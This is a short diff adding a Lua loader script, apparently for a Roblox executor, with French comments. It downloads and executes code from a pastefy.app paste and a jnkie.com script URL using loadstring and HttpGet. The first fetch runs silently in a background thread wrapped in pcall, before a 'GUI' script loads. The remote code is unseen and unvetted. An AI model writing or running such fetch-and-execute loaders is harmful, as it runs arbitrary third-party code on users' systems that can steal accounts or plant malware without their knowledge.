@@ -1,0 +1,18 @@
+-- LANCE LE SCRIPT EXTERNE SANS BLOQUER
+task.spawn(function()
+	pcall(function()
+		loadstring(game:HttpGet("https://pastefy.app/sN3tymyl/raw", true))()
+	end)
+end)
+
+-- ATTENTE
+task.wait(1.5)
+
+-- LANCE TON GUI DANS UN THREAD
+task.spawn(function()
+
+-- =========================
+-- TON SCRIPT GUI COMPLET
+-- =========================
+
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/d4a885f9bee8acc05beb19bd565e83b3db9fa2f3e6f265b556842413bbd0c10e/download"))()
